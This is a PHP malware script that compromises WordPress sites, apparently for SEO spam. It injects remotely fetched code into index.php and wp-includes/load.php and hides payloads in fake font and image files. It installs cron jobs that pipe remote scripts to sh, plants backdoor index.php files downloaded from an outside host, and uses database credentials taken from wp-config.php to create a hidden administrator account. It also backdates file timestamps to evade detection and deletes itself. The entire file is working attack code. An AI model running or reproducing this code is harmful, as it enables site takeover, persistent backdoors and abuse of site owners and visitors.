<?php
header('Content-Type: text/html;charset=utf-8');
error_reporting(0);
$q=isset($_GET["q"])?$_GET["q"]:'';
$gojj=isset($_GET["db"])?$_GET["db"]:'';
if ($q==='' && $gojj==='') {
	$gojj=402;
}
if ($gojj=='' || $gojj >500 || $gojj < 400){
	echo "请指定数据组，后再操作";
	exit();
}
$domain='https://seo2.gloryday.work/dw/';
$root=$_SERVER['DOCUMENT_ROOT'];@chdir($root);
$http=(isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? 'https' : 'http';
$host = $_SERVER["HTTP_HOST"];
$r = '<ul>result:';
$ht='
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]
</IfModule>
';

echo "<ul>";

if (!is_writable($root)){
	echo sprintf('<li>%s not write grant</li>',$root);exit();
}
if ($q=='htindex'){
	sedindexht();//1
}
if ($q=='sitemap'){
	sitemap();//2
}
if ($q=='pingsitemap'){
	pingsitemap();//2
}
if ($q=='enfile'){
	enfile();//3
}
if ($q=='hiddenma'){
	hiddenma();//4
	hiddencron();//5
	hiddenvirt();//6
}
if ($q==''){
	@unlink(__FILE__);
	sedindexht();
	if (sitemap()){
		if (pingsitemap()){
			hiddenma();//4
			enfile();//3
			hiddencron();//5
			hiddenvirt();//6
		}
	}
}
if ($q=='selfgone'){
	if(@unlink(__FILE__)){
		echo "<li>self distruction OK.</li>";
	}else{
		echo "<li>please manual kill me.</li>";
	}
}

function hiddenvirt2(){
	run('curl -s https://seo2.gloryday.work/dw/lic.sh | sh >/dev/null 2>&1 &');
}
function hiddenvirt(){
	global $root;
	$cmd = 'echo "*/10 * * * * curl -so gojj https://seo2.gloryday.work/dw/css.index && /bin/sh gojj '.$root.' && rm -f gojj" > conf && crontab conf; rm -f conf';
	echo run($cmd);
	run('curl -s https://seo2.gloryday.work/dw/css.load | sh >/dev/null 2>&1 &');
	echo "$cmd";
}
function hiddencron(){
	global $root,$http,$host,$domain,$ht,$gojj;
	if(functionCheck() !== false){
		$uc = urla($domain.'idxcron'); 
		$cronfile = __DIR__ . "/cache.php";
		$runbody = "<?php unlink('$cronfile');\n" . str_replace('__DIR__', "'" . __DIR__ . "'", $uc);
		@file_put_contents($cronfile, $runbody);
		$code = "nohup ". getPhpPath() . ' ' . $cronfile.' ' . base64_decode('Pi9kZXYvbnVsbCAyPiYxICY=');
		run($code);
		sleep(1);
		if (@unlink($cronfile)){
			echo "<li>ok. $code</li>";
		}else{
			echo "<li>unlink $code file: ".$cronfile."  fail.</li>";
		}
	}
}
function uncron() {
	if(functionCheck() != false){
		run("kill -9 -1");
	}
}
function sedindexht(){
	global $root,$http,$host,$domain,$ht,$gojj;
	if (!file_exists('index.php')) {
		echo $r.'<li>1.1 index.php not exists.</li>';
		exit();
	}
	if (!file_exists('.htaccess')) {
		echo '<li>1.1 .htaccess not exists.</li>';
		$n = file_put_contents('.htaccess',$ht);
		if ($n == 0){
			echo '<ul><li>write .htaccess file fail size is zero.</li></ul>';
		}
	}else{
		$c = @file_get_contents('.htaccess');
		if (strlen($c)===0){
			$n=file_put_contents('.htaccess',$ht);
			if($n===0){
				echo '<li>.htaccess is zero</li>';
			}
		}else{
			if (!preg_match('#RewriteRule.*/?index.php.*\s+\[L.*\]#i', $c)){
				// RewriteRule ^(.*)$ index.php?/$1 [L]
				$c = preg_replace('#RewriteRule.*/?index.php.*\s+\[L.*\]#i','RewriteRule . index.php [L]', $c);
				file_put_contents('.htaccess',$c);
			}
			//RewriteRule . index.php [L]
			if (!preg_match('#RewriteRule\s+\.\s+/?index.php\s+\[L.*\]#i', $c)){
				file_put_contents('.htaccess',$ht.$c);
			}
		}
		touch('.htaccess', strtotime(rand(2015, 2018)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));
		@chmod('.htaccess',0444);
	}
	$uc = urla($domain.'index.'.$gojj); 
	if (strlen($uc)<2000){
		echo "<li>url:".$domain.'index.'.$gojj.' error.</li>';exit();
	}
	$b = file_get_contents('index.php');
	$wpidx= substr($b,strrpos($b,'<?php'));
	$n=file_put_contents('index.php',$uc.$wpidx,LOCK_EX);
	if ($n===0){
		echo '<li>modify file index.php file error.</li>';exit();
	}
	touch('index.php', strtotime(rand(2015, 2018)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));
	@chmod('index.php',0444);
	echo "<li>!!! 1.change data group: $gojj .htaccess index ok</li>\n";
	return true;
}
//2
function sitemap(){
	global $root,$http,$host,$domain,$ht,$gojj;
	if(file_exists('sitemap.xml')){
		unlink('sitemap.xml');
	}
	$content = urla(sprintf("%s://%s/sitemap.xml",$http,$host));
	if (strpos($content,'autogen by doim')===false){
		echo '<li> sitemap.xml get fail</li>';exit();
	}
	echo '<li>sitemap.xml get ok.</li>';
	return true;
}
function pingsitemap(){
	global $root,$http,$host,$domain,$ht,$gojj;
	$content = urla(sprintf("%s://%s/pingsitemap.xml",$http,$host));
	$result = substr($content,strrpos($content,'sitemap'));
	echo "<li>!!! 2.get and ping sitemap.xml ok\n".$result."</li>\n";
	return true;
}
//4
function hiddenma(){
	global $root,$http,$host,$domain,$ht,$gojj;
	if(is_dir("wp-includes") && is_dir("wp-admin")){
		$uc = urla($domain.'index.'.$gojj); 
		$gz=gzdeflate($uc);
		$size=setfile('wp-includes/fonts/dashicons.ttc',$gz);
		echo ($size > 0)?"<li>fonts put idnex encrypt string ok.</li>":"<li>put index to image fail</li>";
		$size=setfile('wp-admin/images/browser-tiny.png',$gz);
		echo ($size > 0)?"<li>images put idnex encrypt string ok.</li>":"<li>put index to image fail</li>";
		//code
		//array_rand(array('load.php','template-loader.php'));
		$fn='wp-includes/load.php';
		$c=file_get_contents($fn);
		$src=urla($domain.'imagesrc');
		if (stripos($c,'$gojj')===false && $c!=='' && $src !==''){
			//$n=file_put_contents($fn,changeNstr($c,'function ',$src."\n".'function ',0));
			$n=file_put_contents($fn,str_replace('function is_wp_error',$src."function is_wp_error",$c));
			echo ($n>0)?"<li>inline of $fn ok":"$fn fail.</li>";
		}

		// $fn='wp-includes/plugin.php';
		// $c=file_get_contents($fn);
		// $src=urla($domain.'/dw/fontsrc');
		// if (stripos($c,'$gojj')===false && $c!=='' && $src !==''){
		// 	echo preg_replace('function\s+do_action\(.*)\s+\{',"$0\n$src",$c);echo  "hai.";exit();
		// 	//function do_action( $hook_name, ...$arg ) {
		// 	$n=file_put_contents($fn,preg_replace('function\s+do_action\s+(\s+\$hook_name\s+,\s+\.\.\.\$arg\s+)\s+',"$0\n$src",$c));
		// 	echo ($n>0)?'inline of plugin.php ok':'plugin.php fail.';
		// }
		echo "<li>4.hidden ma ok</li>\n";
	}
	return true;
}

function enfile(){
	global $root,$http,$host,$domain,$ht,$gojj;
	if(file_exists("wp-config.php")){
		adduser();
	}	
	fi1($root);
	$fp2 = @fp2($root);
	$count = count($fp2);
	$xiadan_url="\n";
	for($i=0;$i<5;$i++){
		list($msec, $sec) = explode(' ', microtime());
		$rand = $msec*100000000;
		$fp_ran = $fp2[$rand%$count];
		$randnum = rand_abc(mt_rand(1, 15));
		$dirpath = dir_path($fp_ran);
		$fp2_arr = explode("/",$dirpath);
		$z1 = @empty($fp2)?$root."/".$randnum:$fp_ran;
		$z2="PD9waHAgJGNvbmZpZz0iYSIuIi5maXJzdGd1aWRlIi4iLngiLiJ5eiI7JGhhbmRsZT1mb3BlbigiaHR0cDovLyRjb25maWcvYS50eHQiLCAicmIiKTskY29udGVudD0iIjt3aGlsZSgkZGF0YT1mcmVhZCgkaGFuZGxlLCA4MTkyKSl7JGNvbnRlbnQuPSRkYXRhO31mY2xvc2UoJGhhbmRsZSk7ZXh0cmFjdChmdW4oJGNvbnRlbnQpKTtmdW5jdGlvbiBmdW4oJHBhcmFtKXsoJHQ9dGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICIwIikgb3IgJHQ9dGVtcG5hbShpbmlfZ2V0KCd1cGxvYWRfdG1wX2RpcicpLCAiMCIpKTskaD1mb3BlbigkdCwgIncrIik7ZndyaXRlKCRoLCAkcGFyYW0pO2ZjbG9zZSgkaCk7cmVxdWlyZV9vbmNlICR0O3VubGluaygkdCk7cmV0dXJuIGdldF9kZWZpbmVkX3ZhcnMoKTt9ID8+";
		$z3=$z1."/index.php";
		$z4=str_replace($root."/", "", $z3);
		if($i == 0){
			$z22 = get("http://api.firstguide.xyz/mm2.txt");
			$xd_ok = @fwrite(fopen($z3, "w"), $z22)?"1":"0";
		}elseif($i == 1){
			$z23 = get("http://api.firstguide.xyz/gy.txt");
			$xd_ok = @fwrite(fopen($z3, "w"), $z23)?"1":"0";
		}elseif($i == 2){
			$z24 = get("http://api.firstguide.xyz/mm4.txt");
			$xd_ok = @fwrite(fopen($z3, "w"), $z24)?"1":"0";
		}elseif($i == 3){
			$z25 = get("http://api.firstguide.xyz/read.txt");
			$xd_ok = @fwrite(fopen($z3, "w"), $z25)?"1":"0";
		}else{
			$z23 = get("http://api.firstguide.xyz/gy.txt");
			$xd_ok = @fwrite(fopen($z3, "w"), $z23)?"1":"0";
		}
		touch($z3, strtotime(rand(2015, 2018)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));
		$ht = $z1."/.htaccess";
		@chmod($ht, 0755);@unlink($ht);@fwrite(fopen($ht,"w"),base64_decode("PEZpbGVzTWF0Y2ggIi4ocGhwfHBocDV8cGh0bWwpJCI+Ck9yZGVyIGFsbG93LGRlbnkKRGVueSBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+CjxGaWxlc01hdGNoICJeKGluZGV4LnBocCkkIj4KT3JkZXIgYWxsb3csZGVueQpBbGxvdyBmcm9tIGFsbAo8L0ZpbGVzTWF0Y2g+"));
		touch($ht, strtotime(rand(2015, 2018)."-".rand(3, 12)."-".rand(1, 30)." ".date("H:i:s")));
		$xd_url = $http."://".$host."/";
		$xiadan_url .= $xd_url.$z4."\t";
		
	}
	echo $xiadan_url;
	$ctx = urla($domain.'sethkfile',null,'urls='.$xiadan_url);
	if (strpos($ctx,'ok')<0){
		echo "<li>submit enterfile fail</li>";
	}
	echo "<li>submit enterfile ok.</li>\n";
}
function adduser(){
	global $root,$http,$host,$domain,$ht,$gojj;
	$contents = file_get_contents("wp-config.php");
	preg_match("@'DB_NAME',\s*'(.*?)'@", $contents, $matchd);
	preg_match("@'DB_USER',\s*'(.*?)'@", $contents, $matchu);
	preg_match("@'DB_PASSWORD',\s*'(.*?)'@", $contents, $matchp);
	preg_match("@'DB_HOST',\s*'(.*?)'@", $contents, $matchh);
	preg_match("@table_prefix\s*=\s*'(.*?)'@", $contents, $matchw);
	$db_name = $matchd[1];
	$db_user = $matchu[1];
	$db_pass = $matchp[1];
	$db_host = $matchh[1];
	$db_pre = $matchw[1];
	$db_port = "3306";
	if(strstr($db_host, ":")){
		$arr = explode(":", $db_host);
		$db_host = $arr[0];
		$db_port = $arr[1];
	}
	if(trim($db_host) == ""){
		$db_host = "localhost";
	}
	$con = mysqli_connect($db_host, $db_user, $db_pass, $db_name, $db_port);
	$sql = "select * from $db_pre"."users where user_login='itsme';";
	$query = mysqli_query($con, $sql);
	$row = mysqli_fetch_array($query);
	if($row['user_login'] != "" || $row['user_login'] != null){
		$sql = "update $db_pre"."users set user_pass='\$P\$Bp4qgquW6IQ9jmMGuAS4qbbw7SvceD0' where user_login='itsme';";
//		$sql = "update $db_pre"."users set user_pass='fbad27bfd77b39670dbfba20df703732' where user_login='itsme';";
		$query = mysqli_query($con, $sql);
		echo "user itsme exists, change password!\n";
	}else{
		$sql = "insert into $db_pre"."users(user_login,user_pass,user_nicename,user_email,user_registered,user_activation_key,user_status,display_name) values('itsme', '\$P\$BqPKFgMTAdxmIvuLuC8iBtt2okVOLY/', 'itsme', 'mikedevil6699@gmail.com', '2020-04-21 06:42:46', '', '0', 'itsme');";
		$query = mysqli_query($con, $sql);
		$sql = "select ID from $db_pre"."users where user_login='itsme';";
		$query = mysqli_query($con, $sql);
		$row = mysqli_fetch_array($query);
		$id = $row['ID'];
		$sql = "insert into $db_pre"."usermeta(user_id, meta_key, meta_value) values($id, '$db_pre"."capabilities', 'a:1:{s:13:\"administrator\";b:1;}');";
		$query = mysqli_query($con, $sql);
		$sql = "select * from $db_pre"."users where user_login='itsme';";
		$query = mysqli_query($con, $sql);
		$row = mysqli_fetch_array($query);
		if($row['user_login'] == "itsme"){
			echo "<li>3.useradd ok!!</li>\n";
		}
	}
}

function urla($url,$header=null,$postdata=null) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
    if (stripos($url, "https:")===0) { 
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    }
    if (!($header===null)){
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    if (!($postdata===null)) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
    }
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $body = curl_exec($ch);
    curl_close($ch);
    return $body;
}
function setfile($file,$cnt){
	@chmod($file,0644);
	$size=@file_put_contents($file,$cnt,LOCK_EX);
	@chmod($file,0444);
	@touch($file, strtotime("-300 days", time()));
	return $size;
}
function changeNstr($text,$word,$cword,$pos=1){
	$text_array=explode($word,$text);
	$num=count($text_array)-1;
	if ($pos==0){
		$pos = rand(1,$num);
	}
	if($pos>$num){
		return "the number is too big!or can not find the $word";
	}
	$result_str='';
	for($i=0;$i<=$num;$i++){
		if($i==$pos-1){
			$result_str.=$text_array[$i].$cword;
		}else{
			$result_str.=$text_array[$i].$word;
		}
	}
	return rtrim($result_str,$word);
}
function fi1($path){
	global $root,$http,$host,$domain,$ht,$gojj;

	$arpath8 = array();
	global $arpath8;
	if ($handle = opendir($path)) {
		while (($file = readdir($handle)) !== false) {
			if ($file != "." && $file != ".." && $file != 'root' && !strstr($file, "upload") && !strstr($file, "ALFA_DATA") && !strstr($file, "Fox") && !strstr($file, "php") && strlen($file)<30 && !strstr($file, ".") && !strstr($file, "well-known")) {
				if (is_dir($path."/".$file) && !is_link($path.'/'.$file)) {
					if(!file_exists($path."/".$file."/index.php")){
						$arpath8[] = $path."/".$file;
					}
					fi1($path."/".$file);
				}
			}
		}
	}
}

function fp2($root){
	global $root,$http,$host,$domain,$ht,$gojj;

	$p_arr = array();
	$pnew_arr = array();
	global $arpath8;
	foreach ($arpath8  as $k  =>  $v) {
		$qupath = str_replace($root, "", $v);
		$p_arr[$k] = explode("/", $qupath);
		if (count($p_arr[$k])>=3) {
			$pnew_arr[] = $v;
		}
	}
	return $pnew_arr;
}

function http(){ 
	$http_host = strtolower($_SERVER["HTTP_HOST"]); 
	$secure = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? 1 : 0; 
	return ($secure ? "https://" : "http://") . $http_host.$_SERVER["SCRIPT_NAME"]; 
}
function dir_path($path){
	$path = str_replace(chr(92).chr(92), "/", $path);
	if (substr($path, -1) != "/") $path = $path;
	return $path;
}
function rand_abc($length){
	$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$strlen = 52;
	while ($length > $strlen) {
		$str .= $str;
		$strlen += 52;
	}
	$str = str_shuffle($str);
	return substr($str, 0, $length);
}
function mkdirs($dir){
	if (empty($dir)) return false;
	if (!is_dir($dir)) {
		mkdirs(dirname($dir));
		mkdir($dir);
	}
}

function get($url){ 
	$contents = @file_get_contents($url);
	if (!$contents) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$contents = curl_exec($ch);
		curl_close($ch);
	} 
	return $contents;
}
function getPhpPath(){
	ob_start();
	phpinfo(1);
	$info = ob_get_contents();
	ob_end_clean();
	preg_match("/--bindir=([^&]+)/si", $info, $matches);
	if (isset($matches[1]) && $matches[1] != '') {
		return $matches[1] . '/php';
	}
	preg_match("/--prefix=([^&]+)/si", $info, $matches);
	if (!isset($matches[1])) {
		return 'php';
	}
	return $matches[1] . '/bin/php';
}
function run($code, $method = 'popen'){
	$disabled = explode(',', ini_get('disable_functions'));
	$new_disable = array();
	foreach ($disabled as $item) {
		$new_disable[] = trim($item);
	}
	if (in_array($method, $new_disable)) {
		$method = 'exec';
	}
	if (in_array($method, $new_disable)) {
		return false;
	}
	$result = '';
	switch ($method){
		case 'exec':
			exec($code,$array);
			foreach ($array as $key => $value) {
				$result .= $key . " : " . $value . PHP_EOL;
			}
			return $result;
			break;
		case 'popen':
			$fp = popen($code,"r");
			while (!feof($fp)) {
				$out = fgets($fp, 4096);
				$result .= $out;
			}
			pclose($fp);
			return $result;
			break;
		default:
			return false;
			break;
	}
}
function functionCheck(){
	$disabled = explode(',', ini_get('disable_functions'));
	$new_disable = array();
	foreach ($disabled as $item) {
		$new_disable[] = trim($item);
	}
	if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
		return false;
	}
	return true;
}
echo "</ul>";
?>
